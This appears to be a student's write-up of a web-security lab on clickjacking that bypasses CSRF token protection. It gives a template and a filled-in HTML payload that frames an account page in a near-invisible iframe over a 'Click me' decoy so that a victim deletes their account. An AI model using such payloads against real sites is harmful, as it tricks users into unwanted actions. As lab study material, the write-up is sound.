# 01 Lab: Basic clickjacking with CSRF token protection

```jsx
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter
```

```jsx
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

```

![image.png](01%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protecti%20bfdf09e29f5e49bcba131b9923dbbf47/image.png)

![image.png](01%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protecti%20bfdf09e29f5e49bcba131b9923dbbf47/image%201.png)

![image.png](01%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protecti%20bfdf09e29f5e49bcba131b9923dbbf47/image%202.png)

```jsx
<style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:497px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a2600e2034886538053e9cb00a00064.web-security-academy.net/my-account"></iframe>
```

![image.png](01%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protecti%20bfdf09e29f5e49bcba131b9923dbbf47/image%203.png)

Es importante el opacity, en mi caso he probado con diferentes bvalores y el que me aceptó es el siguiente opacity: 0.00001